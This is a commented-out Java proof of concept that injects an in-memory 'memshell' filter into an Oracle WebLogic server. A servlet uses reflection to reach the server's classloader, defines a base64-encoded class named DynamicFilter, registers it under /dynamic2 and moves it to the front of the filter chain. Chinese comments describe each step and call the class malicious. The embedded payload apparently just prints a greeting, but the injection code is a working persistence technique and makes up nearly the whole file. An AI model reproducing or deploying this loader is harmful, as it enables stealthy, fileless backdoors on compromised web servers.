//package com.memshell.weblogic;
//
//import sun.misc.BASE64Decoder;
//import weblogic.servlet.utils.ServletMapping;
//import weblogic.utils.collections.MatchMap;
//import javax.servlet.http.HttpServlet;
//import javax.servlet.http.HttpServletRequest;
//import javax.servlet.http.HttpServletResponse;
//import java.lang.reflect.Field;
//import java.lang.reflect.Method;
//import java.util.ArrayList;
//import java.util.Map;
//
//
//public class FilterBasedBasicVariant extends HttpServlet {
//    @Override
//    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
//        try {
//            Field contextField = req.getClass().getDeclaredField("context");
//            contextField.setAccessible(true);
//            Object context = contextField.get(req);
//
//            //第一步：将evilClass加载到classloader的cachedClasses中
//            Field classLoaderField = context.getClass().getDeclaredField("classLoader");
//            classLoaderField.setAccessible(true);
//            ClassLoader cl = (ClassLoader) classLoaderField.get(context);
//
//            Field cachedClassesF = cl.getClass().getDeclaredField("cachedClasses");
//            cachedClassesF.setAccessible(true);
//            Object cachedClass = cachedClassesF.get(cl);
//
//            Method getMethod = cachedClass.getClass().getDeclaredMethod("get", Object.class);
//            // 判断一下，防止多次加载恶意 filter， 默认只加载一次，不需要重复加载
//            if (getMethod.invoke(cachedClass, "DynamicFilter") == null) {
//                System.out.println("[+] 加载动态 Filter...");
//                BASE64Decoder base64Decoder = new BASE64Decoder();
//                String codeClass = "yv66vgAAADIAMgoABgAhCQAiACMIACQKACUAJgcAJwcAKAcAKQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAsTGNvbS9tZW1zaGVsbC9nZW5lcmljL0R5bmFtaWNGaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwAqAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEABWNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47BwArAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAC9EeW5hbWljRmlsdGVyVGVtcGxhdGUuamF2YSBmcm9tIElucHV0RmlsZU9iamVjdAwACAAJBwAsDAAtAC4BAClJJ20gRmlsdGVyIEJhc2VkIE1lbXNoZWxsLCBob3cgZG8geW91IGRvPwcALwwAMAAxAQAqY29tL21lbXNoZWxsL2dlbmVyaWMvRHluYW1pY0ZpbHRlclRlbXBsYXRlAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgAhAAUABgABAAcAAAAEAAEACAAJAAEACgAAAC8AAQABAAAABSq3AAGxAAAAAgALAAAABgABAAAABgAMAAAADAABAAAABQANAA4AAAABAA8AEAACAAoAAAA1AAAAAgAAAAGxAAAAAgALAAAABgABAAAACwAMAAAAFgACAAAAAQANAA4AAAAAAAEAEQASAAEAEwAAAAQAAQAUAAEAFQAWAAIACgAAAFUAAgAEAAAACbIAAhIDtgAEsQAAAAIACwAAAAoAAgAAABUACAAWAAwAAAAqAAQAAAAJAA0ADgAAAAAACQAXABgAAQAAAAkAGQAaAAIAAAAJABsAHAADABMAAAAGAAIAHQAUAAEAHgAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAbAAwAAAAMAAEAAAABAA0ADgAAAAEAHwAAAAIAIA==";
//                byte[] bytes = base64Decoder.decodeBuffer(codeClass);
//                Method defineClass = cl.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                defineClass.setAccessible(true);
//                Class dynamicFilterClass = (Class) defineClass.invoke(cl, bytes, 0, bytes.length);
//
//                // 在这里 恶意类名称为 DynamicFilter, filter名称为 dynamic2
//                Method putMethod = cachedClass.getClass().getDeclaredMethod("put", Object.class, Object.class);
//                putMethod.invoke(cachedClass, "DynamicFilter", dynamicFilterClass);
//
//                //第二步：将 Filter 注册进 FilterManager
//                Method getFilterManagerMethod = context.getClass().getDeclaredMethod("getFilterManager");
//                Object filterManager = getFilterManagerMethod.invoke(context);
//
//                //参数： String filterName, String filterClassName, String[] urlPatterns, String[] servletNames, Map initParams, String[] dispatchers
//                Method registerFilterMethod = filterManager.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
//                registerFilterMethod.setAccessible(true);
//                registerFilterMethod.invoke(filterManager, "dynamic2", "DynamicFilter", new String[]{"/dynamic2"}, null, null, null);
//
//                //第三步：将我们添加的 Filter 移动到 FilterChian 的第一位
//                Field filterPatternListField = filterManager.getClass().getDeclaredField("filterPatternList");
//                filterPatternListField.setAccessible(true);
//                ArrayList filterPatternList = (ArrayList)filterPatternListField.get(filterManager);
//
//                //不能用 filterName 来判断，因为在 10g 中此值为空，在 12g 中正常
//                for(int i = 0; i < filterPatternList.size(); i++){
//                    Object filterPattern = filterPatternList.get(i);
//                    Field f = filterPattern.getClass().getDeclaredField("map");
//                    f.setAccessible(true);
//                    ServletMapping mapping = (ServletMapping) f.get(filterPattern);
//
//                    f = mapping.getClass().getSuperclass().getDeclaredField("matchMap");
//                    f.setAccessible(true);
//                    MatchMap matchMap = (MatchMap)f.get(mapping);
//
//                    Object result = matchMap.match("/dynamic2");
//                    if(result != null && result.toString().contains("/dynamic2")){
//                         Object temp = filterPattern;
//                         filterPatternList.set(i, filterPatternList.get(0));
//                         filterPatternList.set(0, temp);
//                         break;
//                    }
//                }
//            }
//        } catch (Exception e) {
//            System.out.println(e.getCause());
//            e.printStackTrace();
//        }
//    }
//}